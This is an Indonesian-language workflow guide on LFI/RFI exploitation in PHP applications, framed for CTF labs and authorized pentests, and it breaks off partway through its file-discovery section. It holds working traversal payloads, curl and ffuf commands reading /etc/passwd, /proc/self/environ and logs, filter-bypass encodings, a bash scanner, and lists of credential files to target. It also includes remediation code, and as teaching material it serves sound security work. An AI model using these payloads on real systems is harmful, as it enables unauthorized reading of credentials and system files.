---
id: "24"
title: "Workflow 24 — LFI / RFI"
category: "3. Web Exploitation"
categoryId: "web"
filename: "24_lfi_rfi_workflow.md"
refs_out: ["06","07","14a","14c","14d","17a","23","25","44","47","64"]
refs_in: ["06","15","25","27"]
---

← [File 23: SSTI](/docs/ssti)

---

# Workflow 24 — LFI / RFI

> **Scope:** HackTheBox, TryHackMe, PortSwigger Labs, CTF, dan lab yang secara eksplisit mengizinkan pengujian eksploitasi — serta authorized pentest dengan scope yang jelas.
> 
> **Platform:** Parrot OS XFCE, Debian-based Linux (attacker box).
> 
> **Tujuan:** satu authoritative decision layer untuk **parameter discovery → path read/inclusion → sensitive file disclosure → wrapper/log/upload/session primitive → (mungkin) code execution**, plus jalur RFI yang terpisah secara konseptual.

---

## Scope

Dokumen ini membahas Local File Inclusion (LFI), path traversal murni, dan Remote File Inclusion (RFI) — termasuk turunan Windows UNC/SMB resource access. Konteks utama adalah aplikasi PHP karena paling umum muncul di CTF, tetapi Bagian 8 membahas semantics LFI pada non-PHP context secara terpisah dan eksplisit.

Recon dasar (fingerprint OS, web server, framework/CMS) **tidak** diulang penuh di sini — file ini mengasumsikan evidence tersebut sudah ada dari workflow recon/enumerasi sebelumnya. Lihat Bagian 11 untuk cross-reference.

---

## Core Principle

> **LFI confirmed ≠ RCE guaranteed.**

LFI adalah kemampuan aplikasi untuk mengakses/meng-include file berdasarkan input attacker. Jalur menuju RCE **tidak linear** — ia bergantung pada evidence yang ditemukan di setiap tahap:

```text
LFI CONFIRMED
    ↓
What did we learn?              (source code? config? runtime info?)
    ↓
What new attack surface exists?  (upload endpoint? log path? session storage?)
    ↓
What primitive is available?     (wrapper? attacker-controlled file? remote include?)
    ↓
Can content be influenced?       (bisa attacker menulis byte ke lokasi yang di-include?)
    ↓
Can included content be interpreted?  (apakah interpreter benar-benar memproses byte tsb sebagai code?)
    ↓
Possible RCE (bukan default outcome)
```

Jangan memperlakukan LFI sebagai jalur linear `LFI → RCE`. Setiap panah di atas adalah **pertanyaan yang harus dijawab dengan evidence**, bukan langkah otomatis.

---

## Operating Modes

### CTF / Lab

- Aggressive validation dapat diterima selama masih dalam scope lab.
- Exploit chain penuh (LFI → RCE → privesc → pivot) boleh dikejar sampai selesai.
- Artefak spesifik challenge (flag, marker payload) boleh digunakan untuk validasi cepat.

### Authorized Pentest

- Validasi seminimal mungkin — cukup untuk membuktikan impact, bukan untuk mengeksploitasi penuh.
- Hindari payload destruktif (reverse shell hanya bila diizinkan scope; hindari overwrite/delete).
- Kumpulkan evidence yang reproducible: request, response, payload, dan root cause.
- Hentikan eskalasi begitu impact sudah cukup dibuktikan (mis. source disclosure sudah cukup — tidak perlu lanjut ke reverse shell bila tidak diminta).
- Dokumentasikan komponen yang terdampak dan remediation (lihat Bagian 10).

Kedua mode menggunakan **decision layer dan teknik yang sama** di Bagian 0 — perbedaannya ada di seberapa jauh eskalasi dilakukan dan bagaimana evidence didokumentasikan, bukan pada teknik itu sendiri.

---

# Daftar Isi

- [Part 0 — Master Decision Layer](#part-0--master-decision-layer)
- [Part 1 — LFI Detection](#part-1--lfi-detection)
- [Part 2 — Path Traversal & Normalization](#part-2--path-traversal--normalization)
- [Part 3 — Sensitive File / Application Discovery](#part-3--sensitive-file--application-discovery)
- [Part 4 — PHP Wrappers](#part-4--php-wrappers)
- [Part 5 — LFI → Code Execution (Overview)](#part-5--lfi--code-execution-overview)
- [Part 6 — Attacker-Controlled File Primitives](#part-6--attacker-controlled-file-primitives)
- [Part 7 — Remote File Inclusion (RFI)](#part-7--remote-file-inclusion-rfi)
- [Part 8 — Non-PHP Contexts](#part-8--non-php-contexts)
- [Part 9 — Troubleshooting](#part-9--troubleshooting)
- [Part 10 — Pentest Evidence & Remediation](#part-10--pentest-evidence--remediation)
- [Part 11 — Cross-Workflow References](#part-11--cross-workflow-references)
- [Quick Reference](#quick-reference)
- [60-Second Muscle Memory](#60-second-muscle-memory)
- [References](#references)

---

# Part 0 — Master Decision Layer

Ini adalah **satu-satunya** decision tree utama di dokumen ini. Semua bagian lain (wrapper, log poisoning, upload, session, RFI) adalah _reference layer_ yang dirujuk dari sini — jangan mencari "decision tree" lain di bagian bawah dokumen.

## 0.1 Tiga Primitive yang Harus Dibedakan

Jangan menyamakan tiga hal berikut — ini sumber kesalahan paling umum:

```text
1. PATH READ / ARBITRARY FILE READ
   User controls path
        ↓
   Aplikasi membuka/mengembalikan isi file
        ↓
   Arbitrary local resource dapat dibaca
   (belum tentu diproses sebagai code)

2. FILE INCLUDE (LFI)
   User controls include target
        ↓
   Aplikasi meng-include/meng-eksekusi resource tsb (include/require/load_template dsb)
        ↓
   Jika resource adalah kode yang dipahami interpreter → berpotensi diproses sebagai code

3. CODE EXECUTION
   FILE INCLUDE
        +
   attacker-controlled executable content pada lokasi yang di-include
        +
   interpreter/konfigurasi yang sesuai memprosesnya
        ↓
   POSSIBLE CODE EXECUTION (bukan otomatis)
```

**Aturan:** arbitrary file read **tidak otomatis** berarti LFI (aplikasi mungkin hanya `readfile()`/`send_file()`, bukan `include()`). LFI **tidak otomatis** berarti RCE (butuh attacker-controlled content + interpreter yang memprosesnya). Selalu verifikasi primitive mana yang benar-benar ada sebelum mengasumsikan primitive berikutnya.

## 0.2 Master Decision Tree

```text
PARAMETER / RESOURCE CONTROL
        ↓
Does input control a file/resource? (file=, page=, path=, template=, cookie, header, dst — lihat Part 1)
        ↓
What primitive exists?
        ├── PATH READ        → Part 1 (deteksi) → Part 3 (target file)
        └── FILE INCLUDE      → lanjut di bawah
                ↓
        Confirm local access/inclusion (Part 1: baseline vs marker file, bukan sekadar HTTP 200)
                ↓
        Identify OS / application / runtime (dari evidence, bukan recon ulang — lihat Part 11)
                ↓
        What information has highest value?  (Part 3, objective-driven — jangan baca semua file secara acak)
                ├── OS/users               → /etc/passwd, /etc/hosts, /etc/hostname
                ├── application source      → index.php, config.php, framework files
                ├── credentials/config      → .env, wp-config.php, config.php
                ├── logs                    → access.log, auth.log, mail.log
                ├── upload paths            → dari source code / response upload
                ├── session/environment     → /proc/self/environ, session storage
                └── internal resources      → /proc/net/tcp, internal service hints
                ↓
        Reassess after new evidence (source code baru sering membuka target baru — lihat 0.3)
                ↓
        Need source disclosure?
                └── PHP → php://filter (Part 4.2) — confidence HIGH bila base64 valid & dapat di-decode
                ↓
        Need code execution?
                ↓
        Which execution primitive exists?  (verifikasi SATU per SATU, jangan asumsikan tersedia)
                ├── attacker-controlled file sudah ter-upload      → Part 6.1
                ├── upload endpoint ditemukan dari source           → Part 6.1
                ├── log dapat dibaca DAN attacker dapat menulis ke log → Part 6.2
                ├── php://input dengan include() behavior cocok    → Part 4.3
                ├── data:// dengan wrapper/config mendukung        → Part 4.4
                ├── filter-chain runtime/PHP build mendukung       → Part 4.8
                ├── zip://phar:// dengan archive ter-upload         → Part 4.6
                └── remote include (allow_url_include=On)          → Part 7 (RFI)
                ↓
        Verify prerequisites untuk primitive yang dipilih (lihat sub-bagian masing-masing)
                ↓
        Validate dengan primitive sederhana: id / whoami / pwd / hostname
                ↓
        RCE confirmed / not confirmed (evidence-based, bukan asumsi)
```

**Catatan penting:** tidak semua cabang di atas wajib dijalankan berurutan. Workflow ini berbasis evidence — lompat ke cabang yang paling didukung oleh apa yang sudah ditemukan, bukan mencoba semua opsi secara linear.

## 0.3 Source Disclosure sebagai Information Pivot

Salah satu pola paling bernilai dalam LFI: source code disclosure hampir selalu membuka attack surface baru, bukan menjadi tujuan akhir.

```text
LFI → php://filter → index.php → config.php → .env → DB credentials → akses database / aplikasi lain
LFI → source code → upload directory ditemukan → upload → LFI include uploaded file → RCE
LFI → source code → log path ditemukan (custom, bukan default) → log poison → RCE
LFI → source code → include()/require() lain ditemukan → LFI kedua yang lebih dalam
```

Setiap kali mendapat source disclosure, **ulangi pertanyaan "apa yang baru saya ketahui?"** sebelum memilih primitive RCE — jangan langsung lompat ke filter chain atau upload tanpa mengecek source code dulu.

## 0.4 Prioritas Eksekusi (Hindari Membuang Waktu)

Gunakan urutan ini agar tidak mengejar teknik kompleks sebelum yang sederhana selesai dicoba:

```text
P0 — Termurah/paling pasti
├── /etc/passwd, /etc/hosts, /etc/hostname (konfirmasi LFI)
├── application config (config.php, .env, wp-config.php)
└── php://filter (source disclosure, HIGH confidence bila berhasil)

P1 — Murah, butuh sedikit evidence tambahan
├── /proc/self/environ, /proc/self/cmdline
├── SSH keys (jika home directory diketahui dari /etc/passwd)
└── log discovery (baca dulu, jangan asumsikan writable)

P2 — Butuh prerequisite lebih spesifik
├── php://input / data:// (butuh include() + config cocok)
├── upload + LFI (butuh upload endpoint)
└── log poisoning (butuh log writable + attacker-controlled + interpreted)

P3 — Context-dependent / less common
├── PHP filter chain generator (butuh build/config PHP tertentu — lihat 4.8)
├── expect:// (extension jarang terpasang)
├── session poisoning (butuh session storage location diketahui)
├── zip://phar:// (butuh archive upload)
├── SMB/UNC (khusus Windows)
└── RFI (butuh allow_url_include=On, semakin jarang di deployment modern)
```

## 0.5 Confidence Levels

Gunakan label ini setiap kali menilai evidence, alih-alih kata mutlak seperti "always"/"guaranteed"/"pasti":

|Level|Kriteria|Contoh|
|---|---|---|
|**HIGH**|Known file content dikembalikan secara konsisten dan dapat diverifikasi (mis. `/etc/passwd` format valid, base64 dari `php://filter` ter-decode menjadi PHP valid)|`root:x:0:0:root:/root:/bin/bash` muncul persis|
|**MEDIUM**|Response behavior kuat mengindikasikan local file access, tetapi belum sepenuhnya diverifikasi|Response size berubah signifikan dibanding baseline untuk payload traversal|
|**LOW**|Keyword atau generic error mengindikasikan kemungkinan inclusion, butuh konfirmasi lanjutan|Error `failed to open stream` muncul tanpa isi file yang terbaca|

Setiap klaim teknis di dokumen ini yang bersifat configuration-dependent (filter chain, php://input, expect://, RFI, SMB) harus dibaca dengan asumsi: **tersedia hanya jika prerequisite di sub-bagian terkait terpenuhi**, bukan tersedia secara default.

---

# Part 1 — LFI Detection

## 1.1 Attack Surface — Di Mana Parameter Bisa Bersembunyi

**Decision:** gunakan saat parameter discovery. Jangan hanya mencari `file=` — LFI dapat muncul di GET, POST, cookie, atau header.

### Nama Parameter yang Sering Dicurigai

|Parameter|Contoh|
|---|---|
|`file`|`?file=home.txt`|
|`page`|`?page=home`|
|`include`|`?include=menu.php`|
|`path`|`?path=docs/readme.txt`|
|`doc`|`?doc=manual.pdf`|
|`template`|`?template=home.php`|
|`view`|`?view=dashboard`|
|`lang`|`?lang=en`|
|`dir`|`?dir=reports`|
|`load`|`?load=module.php`|

### GET / POST / Cookie / Header

```http
GET /index.php?page=home
```

```http
POST /render.php

template=home
```

Cookie-based (jika aplikasi melakukan `include($_COOKIE['lang'])`):

```text
Cookie: lang=en
```

Header-based (jika header dimasukkan ke template/log/include path):

```text
User-Agent
Referer
X-Forwarded-For
Custom header
```

### Upload + LFI sebagai Attack Surface

```text
Upload file → temukan storage path → LFI → include uploaded file → potential PHP execution
```

Detail lengkap ada di Part 6.1 — ini hanya pengingat bahwa upload endpoint adalah salah satu sumber parameter yang relevan untuk LFI.

## 1.2 Indikator Vulnerable

### Error Messages

Petunjuk LFI:

```text
include(): Failed opening required
include(): Failed to open stream
require(): Failed opening required
failed to open stream
No such file or directory
Permission denied
```

Contoh PHP:

```text
Warning: include(../../../../etc/passwd):
failed to open stream: No such file or directory
```

Error ini bisa mengungkap target path, working directory, filesystem, dan kadang framework — **confidence LOW** untuk LFI itu sendiri, tapi bernilai untuk debugging payload.

### Reflection vs Inclusion

Input:

```text
?page=../../../../etc/passwd
```

Jika response hanya mengembalikan string `../../../../etc/passwd` apa adanya → itu **reflection**, bukan inclusion.

Jika response berisi:

```text
root:x:0:0:root:/root:/bin/bash
```

→ file content benar-benar mencapai response (**confidence HIGH** untuk file read/inclusion).

## 1.3 Basic LFI Testing — Linux

**Decision:** gunakan setelah menemukan parameter yang mungkin mengontrol file/path.

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=../../../../etc/passwd'
```

Expected pada target vulnerable:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

### Membaca `/etc/passwd`

Format: `username:x:UID:GID:GECOS:home:shell`

Cari: UID 0 (root), human users vs service users, home directory, login shell (`/bin/bash`/`/bin/sh` = bisa login interaktif; `/usr/sbin/nologin` = skip untuk SSH attempt).

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=../../../../etc/passwd' > etc_passwd.txt

grep "/bin/bash\|/bin/sh\|/bin/zsh" etc_passwd.txt | cut -d: -f1 > valid_users.txt
```

### Validasi Lebih Kuat dari Sekadar HTTP 200

Jangan hanya bergantung pada status 200. Gunakan kombinasi: status, response length vs baseline, known marker, body content, error changes.

## 1.4 Basic LFI Testing — Windows

**Decision:** gunakan ketika fingerprint menunjukkan IIS/ASP.NET/Windows host/XAMPP (evidence dari recon, lihat Part 11).

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=../../../../windows/win.ini'
```

Expected: section seperti `[fonts]`, `[extensions]`, `[mci extensions]`.

```bash
curl -sG 'http://10.10.10.10/index.php' \
  --data-urlencode 'page=../../../../windows/system32/drivers/etc/hosts'
```

Mixed slash (beberapa aplikasi Windows menerima campuran `../` dan `..\`):

```text
../..\../
..\..\..\windows\win.ini
```

Absolute path + drive letter (bila input handling target memungkinkan):

```text
C:\Windows\win.ini
C%3A%5CWindows%5Cwin.ini
```

## 1.5 Automation & Tooling

**Decision:** gunakan setelah manual testing dasar sudah dipahami — jangan bergantung penuh pada tool otomatis, karena tool dapat miss custom filter/WAF, salah identifikasi OS, atau menghasilkan false positive. Manual confirmation tetap wajib.

### curl — Manual Testing per Konteks

```bash
# GET
curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'page=../../../../etc/passwd'

# POST
curl -s -X POST 'http://10.10.10.10/index.php' --data-urlencode 'page=../../../../etc/passwd'

# Cookie
curl -s 'http://10.10.10.10/' -H 'Cookie: lang=../../../../etc/passwd'

# Header
curl -s 'http://10.10.10.10/' -H 'User-Agent: ../../../../etc/passwd'
```

### ffuf untuk Fuzzing Traversal

```bash
cat > lfi-payloads.txt <<'EOF'
../../../../etc/passwd
../../../../../etc/passwd
../../../etc/passwd
../../../../etc/hosts
../../../../etc/hostname
../../../../proc/self/environ
../../../../proc/self/cmdline
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
/etc/passwd
EOF

ffuf -u 'http://10.10.10.10/index.php?page=FUZZ' -w lfi-payloads.txt -mc all
```

Baseline dulu sebelum filter by size, karena semua-200-tapi-size-sama adalah tanda false positive:

```bash
BASELINE=$(curl -s "http://10.10.10.10/index.php?page=nonexistent123" | wc -c)
ffuf -u 'http://10.10.10.10/index.php?page=FUZZ' -w lfi-payloads.txt -fs "$BASELINE" -t 50
```

Parameter discovery (jika parameter belum diketahui sama sekali):

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u "http://10.10.10.10/index.php?FUZZ=test" -fs 0 -mc 200 -t 50
```

Prioritas pembacaan hasil: status, size, words, lines, known marker — perbedaan response size adalah **signal (confidence MEDIUM)**, bukan otomatis proof.

### LFISuite / LFImap

Tool automation dengan alur konseptual serupa: URL → parameter discovery → LFI detection → traversal testing → wrapper testing. Karena tooling dan dependency project pihak ketiga dapat berubah, gunakan repository/branch yang memang kamu verifikasi sendiri sebagai source of truth, dan install dalam virtual environment bila memungkinkan.

## 1.6 Detection Script — `lfi_detect.sh`

**Decision:** gunakan sebagai scanner ringan untuk basic LFI, encoded traversal, `php://filter`, dan known sensitive file. Script ini **tidak melakukan RCE otomatis**, dan setiap hasil positif harus dibaca sebagai **"POSSIBLE LFI"**, bukan confirmed LFI — heuristiknya berbasis marker/keyword sederhana (`root:x:0:0:`, `127.0.0.1`, `localhost`, `Linux`, `APP_ENV=`, `PATH=`) yang bisa saja muncul secara kebetulan di halaman normal. Selalu konfirmasi manual dengan Repeater/curl sebelum menganggap ini sebagai bukti final.

```bash
#!/usr/bin/env bash

set -uo pipefail

usage() {
    cat <<'EOF'
Usage:
  ./lfi_detect.sh <URL> <PARAMETER>

Example:
  ./lfi_detect.sh 'http://10.10.10.10/index.php' 'page'

The script tests:
  - /etc/passwd
  - /etc/hosts
  - encoded traversal
  - php://filter source disclosure
EOF
}

if [[ $# -ne 2 ]]; then
    echo "[!] Invalid argument count." >&2
    usage
    exit 1
fi

URL="$1"
PARAM="$2"

if [[ ! "$URL" =~ ^https?://[^[:space:]]+$ ]]; then
    echo "[!] Invalid URL." >&2
    exit 1
fi

if [[ ! "$PARAM" =~ ^[A-Za-z0-9_.\[\]-]+$ ]]; then
    echo "[!] Invalid parameter name." >&2
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo "[!] curl is not installed." >&2
    exit 1
fi

TMPDIR="$(mktemp -d)"
trap 'rm -rf "$TMPDIR"' EXIT

request_payload() {
    local payload="$1"
    local outfile="$2"
    curl --silent --show-error --max-time 10 --get \
        --data-urlencode "${PARAM}=${payload}" \
        "$URL" >"$outfile" 2>"$TMPDIR/curl.err"
    return $?
}

report_lfi() {
    local payload="$1"
    local outfile="$2"
    if grep -Eq \
        '(^|[^A-Za-z0-9_])(root):x:0:0:|127\.0\.0\.1|localhost|Linux|APP_ENV=|PATH=' \
        "$outfile"; then
        echo "[+] POSSIBLE LFI DETECTED"
        echo "    Payload : $payload"
        echo "    Evidence: known file/environment marker (heuristic, confirm manually)"
        return 0
    fi
    return 1
}

echo "=============================================="
echo " LFI Detection Scanner (heuristic — not proof)"
echo "=============================================="
echo "[+] URL       : $URL"
echo "[+] Parameter : $PARAM"
echo

PAYLOADS=(
    '../../../../etc/passwd'
    '../../../../../etc/passwd'
    '../../../../etc/hosts'
    '../../../../etc/hostname'
    '../../../../proc/self/environ'
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    '%252e%252e%252f%252e%252e%252fetc%252fpasswd'
    '/etc/passwd'
    'php://filter/convert.base64-encode/resource=index.php'
)

for payload in "${PAYLOADS[@]}"; do
    OUTFILE="$TMPDIR/response"
    echo
    echo "[-] Testing:"
    echo "    $payload"

    if ! request_payload "$payload" "$OUTFILE"; then
        echo "    [!] HTTP request failed"
        cat "$TMPDIR/curl.err" >&2
        continue
    fi

    SIZE="$(wc -c < "$OUTFILE")"
    echo "    Response size: $SIZE bytes"

    if report_lfi "$payload" "$OUTFILE"; then
        echo "    Response sample:"
        head -c 220 "$OUTFILE" | tr '\n' ' '
        echo
        continue
    fi

    if [[ "$payload" == php://filter/* ]]; then
        if grep -Eq '[A-Za-z0-9+/]{80,}={0,2}' "$OUTFILE"; then
            echo "    [+] POSSIBLE PHP SOURCE DISCLOSURE"
            echo "        php://filter returned base64-like content"
        fi
    fi

    echo "    [-] No strong LFI marker detected"
done

echo
echo "=============================================="
echo " Scan complete"
echo "=============================================="
echo "[!] Results are heuristic."
echo "[!] Confirm manually with Repeater/curl."
```

Jalankan:

```bash
chmod +x lfi_detect.sh
./lfi_detect.sh 'http://10.10.10.10/index.php' 'page'
```

---

# Part 2 — Path Traversal & Normalization

## 2.1 Konsep: Path Traversal vs LFI vs RFI

**Decision:** gunakan setiap kali menemukan parameter yang tampak menentukan file, template, page, document, language, atau path — sebelum mengeksploitasi, tentukan dulu apakah masalahnya sekadar traversal atau benar-benar file inclusion (lihat Part 0.1).

### Path Traversal

Terjadi ketika input attacker dapat mengubah lokasi file yang diakses aplikasi.

```php
<?php
$file = $_GET['file'];
echo file_get_contents("/var/www/html/files/" . $file);
```

Normal: `?file=about.txt`. Masalah: `?file=../../../../etc/passwd` → setelah normalisasi dapat mengarah ke `/etc/passwd`. Ini biasanya berarti **arbitrary file read/access**, belum tentu ada PHP code execution.

### LFI — Local File Inclusion

Terjadi ketika aplikasi melakukan **include/load** terhadap file lokal berdasarkan input attacker:

```php
<?php
$page = $_GET['page'];
include($page);
```

LFI pada PHP jauh lebih menarik karena file yang di-include dapat diproses oleh PHP interpreter — bukan sekadar dibaca.

### RFI — Remote File Inclusion

Aplikasi meng-include resource dari lokasi remote (`http://ATTACKER/file.php`). Detail lengkap di Part 7.

### Diagram Ringkas

```text
                  USER INPUT
                      |
                      v
            +-------------------+
            | file/page/path= ? |
            +-------------------+
                      |
          +-----------+-----------+
          |                       |
          v                       v
     File Access              File Include
          |                       |
          v                       v
   Path Traversal               LFI
                                  |
                    +-------------+-------------+
                    |                           |
                    v                           v
             Local File Read               PHP Processing
                                                |
                                                v
                                         Possible RCE
                                        (wrappers/log/upload/proc — Part 4–6)

                    Remote Resource → RFI → Remote Inclusion (Part 7)
```

### Pattern yang Patut Dicurigai

```php
include($_GET['page']);
require($_GET['file']);
include_once($_GET['template']);
require_once($_GET['view']);
readfile($file);
load_template($template);
```

### Vulnerable vs Aman (untuk konteks remediation, lihat juga Part 10)

Vulnerable:

```php
<?php
$page = $_GET['page'];
include($page);   // user controls full path
```

Lebih aman — allowlist:

```php
<?php
$pages = [
    'home'  => __DIR__ . '/pages/home.php',
    'about' => __DIR__ . '/pages/about.php',
    'login' => __DIR__ . '/pages/login.php',
];
$page = $_GET['page'] ?? 'home';
if (!isset($pages[$page])) {
    http_response_code(404);
    exit('Page not found');
}
include($pages[$page]);
```

Sekarang user hanya memilih **identifier**, bukan arbitrary filesystem path.

Contoh aman lain (path canonicalization + allowlist directory):

```php
<?php
$file = basename($_GET['file'] ?? '');
$base = realpath(__DIR__ . '/files');
$target = realpath($base . DIRECTORY_SEPARATOR . $file);

if ($target === false || !str_starts_with($target, $base . DIRECTORY_SEPARATOR)) {
    http_response_code(404);
    exit('Invalid file');
}
readfile($target);
```

Bahkan validasi path seperti ini tetap harus disesuaikan dengan framework, filesystem, dan symlink behavior target.

## 2.2 Basic Traversal

**Decision:** gunakan sebagai test pertama sebelum mencoba encoding atau bypass yang lebih kompleks.

```text
Linux:   ../  ../../  ../../../  ../../../../etc/passwd
Windows: ..\  ..\..\  ..\..\..\Windows\win.ini
```

```bash
curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'file=../../../../etc/passwd'
curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'file=..\..\..\Windows\win.ini'
```

Jika aplikasi menerima absolute path, traversal tidak perlu sama sekali: `/etc/passwd` atau `C:\Windows\win.ini`.

## 2.3 Depth Calculation

**Decision:** gunakan ketika payload dasar gagal karena jumlah `../` belum mencapai root filesystem.

```text
/var/www/html/  →  .. → /var/www/  →  .. → /var/  →  .. → /  →  etc/passwd
= ../../../etc/passwd
```

**Jangan menggunakan angka 3 secara buta pada semua target** — jika inclusion terjadi dari subdirektori lain (mis. `/var/www/html/includes/`), jumlah traversal bisa berbeda.

Script generator kedalaman:

```bash
#!/usr/bin/env bash
set -euo pipefail

usage() {
    echo "Usage: $0 <max_depth>"
    echo "Example: $0 8"
}

if [[ $# -ne 1 ]]; then
    echo "[!] Exactly one argument is required." >&2
    usage
    exit 1
fi

MAX_DEPTH="$1"
TARGET_FILE="etc/passwd"

if [[ ! "$MAX_DEPTH" =~ ^[1-9][0-9]?$ ]]; then
    echo "[!] Depth must be a positive integer." >&2
    exit 1
fi
if (( MAX_DEPTH > 50 )); then
    echo "[!] Maximum supported depth is 50." >&2
    exit 1
fi

for (( depth=1; depth<=MAX_DEPTH; depth++ )); do
    payload=""
    for (( i=1; i<=depth; i++ )); do
        payload+="../"
    done
    printf '%2d → %s%s\n' "$depth" "$payload" "$TARGET_FILE"
done
```

```bash
chmod +x generate_traversal.sh
./generate_traversal.sh 8
```

## 2.4 Encoding & Filter Bypass — Evidence-Driven

**Decision:** jangan mencoba semua bypass di bawah secara berurutan sebagai ritual. Kirim raw `../` dulu; jika ditolak, **amati kenapa** (filtering? decoding? normalization? prefixing? extension handling?), baru pilih teknik yang sesuai penyebabnya.

```text
RAW ../
    ↓
Rejected?
    ↓
Observe WHY
    ├── filtering (string "../" dihapus/diblokir)
    ├── decoding (terjadi setelah filter)
    ├── normalization (canonicalization berbeda dari raw string)
    ├── prefixing (aplikasi menambah direktori tetap di depan input)
    ├── extension handling (aplikasi menambah suffix seperti .php)
    └── platform-specific path behavior (Windows vs Linux)
```

### URL Encoding

```text
../  →  %2e%2e%2f
```

```bash
curl 'http://10.10.10.10/index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
```

**Berlaku bila:** decoding terjadi _setelah_ filter — jika filter memeriksa string sudah ter-decode, teknik ini tidak berguna.

### Double Encoding

```text
%2e%2e%2f  →  %252e%252e%252f
```

```bash
curl 'http://10.10.10.10/index.php?page=%252e%252e%252f%252e%252e%252fetc%252fpasswd'
```

**Berlaku bila:** ada **dua decoding stage** yang relevan (mis. reverse proxy men-decode sekali, aplikasi men-decode lagi). Jangan asumsikan dua-stage decoder tanpa bukti.

### `....//` dan `..././`

Setelah aplikasi menghapus substring `../` **satu kali** tanpa iterasi:

```text
....//  →  ../   (setelah satu kali strip)
```

```bash
curl 'http://10.10.10.10/index.php?page=....//....//....//etc/passwd'
curl 'http://10.10.10.10/index.php?page=..././..././..././etc/passwd'
```

**Berlaku bila:** filter melakukan single-pass string removal tanpa normalization ulang — tidak universal.

### UTF-8 / Normalization Bypass

```text
raw → URL decode → application normalization → filesystem normalization
```

Cari perbedaan perlakuan di antara tiap tahap. **Jangan anggap "Unicode bypass" universal** — implementasi parser server berbeda-beda.

### Null Byte — Legacy PHP

```text
../../../../etc/passwd%00
```

**Berlaku hanya pada PHP < 5.3.4** dan challenge lama. PHP modern tidak lagi rentan terhadap null-byte termination klasik — jangan posisikan ini sebagai bypass modern universal.

### Absolute Path Bypass

Jika filter fokus pada string `../` tetapi tidak melarang absolute path:

```bash
curl 'http://10.10.10.10/index.php?page=/etc/passwd'
```

### Tabel Applicability

|Filter/Behavior|Kandidat Bypass|Prerequisite|
|---|---|---|
|`../` dihapus satu kali (no iteration)|`....//`|Poor sanitization, single-pass strip|
|`../` diblokir mentah|URL encoding|Decode terjadi setelah filter|
|URL encoding diblokir|Double encoding|Dua decoding stage|
|`/` diblokir|`\`|Windows/application-specific handling|
|Dot traversal diblokir|Absolute path|Absolute path accepted oleh aplikasi|
|Prefix ditambahkan aplikasi|Traversal setelah prefix|Concatenation vulnerable|
|Extension ditambahkan aplikasi (`.php`)|Legacy null byte|PHP lama (< 5.3.4) — jarang applicable|
|Case-sensitive filter|Case variation|Hanya bila filesystem/token relevan case-sensitive|
|Raw string matching|Alternate normalization|Parser mismatch antara filter dan filesystem|

Security decision yang benar seharusnya dilakukan terhadap **canonical path**, bukan string mentah:

```text
Input → URL decode → Normalize path → Canonicalize → Check allowlist/base directory → Open file
```

Filter string sederhana (`if "../" in input: deny`) jauh lebih lemah dari model di atas.

---

# Part 3 — Sensitive File / Application Discovery

**Decision:** gunakan setelah LFI dikonfirmasi. Jangan membaca semua file di bawah secara acak ("spray and pray") — mulai dari **tujuan** (apa yang ingin diketahui), lalu pilih target yang sesuai.

## 3.1 Objective: OS / Users

**Kenapa:** membangun daftar user valid, home directory, dan shell — dasar untuk pivot ke SSH key atau credential reuse.

|File|Evidence yang Diberikan|Next Decision|
|---|---|---|
|`/etc/passwd`|Users, UID/GID, home path, shell|Username kandidat untuk SSH/login; home dir untuk cari SSH key|
|`/etc/hosts`|Hostname/internal mapping|Petunjuk internal network/service lain|
|`/etc/hostname`|Hostname|Konfirmasi identitas mesin|

```bash
curl -sG 'http://10.10.10.10/index.php' --data-urlencode 'page=../../../../etc/passwd'
```

Format: `username:x:UID:GID:GECOS:home:shell` — contoh `root:x:0:0:root:/root:/bin/bash` berarti UID 0, home `/root`, shell `/bin/bash`.

## 3.2 Objective: Runtime / Process Info

**Kenapa:** environment variable dan command line proses sering membocorkan secret/config yang tidak ada di file config biasa.

|File|Evidence|Next Decision|
|---|---|---|
|`/proc/self/environ`|`PATH=`, `HOME=`, `USER=`, `DATABASE_URL=`, `SECRET_KEY=`, `APP_ENV=`|Kandidat credential langsung; juga target log-poisoning-like injection (Part 6.3)|
|`/proc/self/cmdline`|`python app.py`, `gunicorn app:app`, `php-fpm`, `apache2`|Konfirmasi runtime/stack, mempengaruhi pilihan primitive RCE (PHP vs non-PHP, lihat Part 8)|
|`/proc/net/tcp`|Koneksi/listening socket (hex-encoded)|Internal service discovery|
|`/proc/self/status`, `/proc/self/maps`, `/proc/version`|UID/GID/capabilities, memory mapping, kernel info|Konteks privilege untuk fase post-exploitation|

`/proc/self/environ` sering tidak nyaman dibaca karena NUL byte (`VAR=value^@VAR2=value`) — normalize dengan `tr '\0' '\n'` saat parsing.

## 3.3 Objective: Application Source & Config

**Kenapa:** source code dan file config adalah pivot information paling bernilai (lihat Part 0.3).

### Generic Web Config

|File|Yang Dicari|
|---|---|
|`/var/www/html/config.php`|`DB_HOST`, `DB_USER`, `DB_PASSWORD`, `API_KEY`, `SECRET_KEY`|
|`/etc/nginx/nginx.conf`, `/etc/apache2/apache2.conf`|Server configuration, virtual host, log location custom|
|`/etc/ssh/sshd_config`|Auth configuration|
|`php.ini`|Inclusion/wrapper-related configuration (`allow_url_include`, `disable_functions`, `open_basedir`)|

### Application/Framework-Specific

|Platform|File|Yang Dicari|
|---|---|---|
|Laravel|`.env`|`APP_KEY`, `APP_ENV`, `DB_HOST`, `DB_DATABASE`, `DB_USERNAME`, `DB_PASSWORD`|
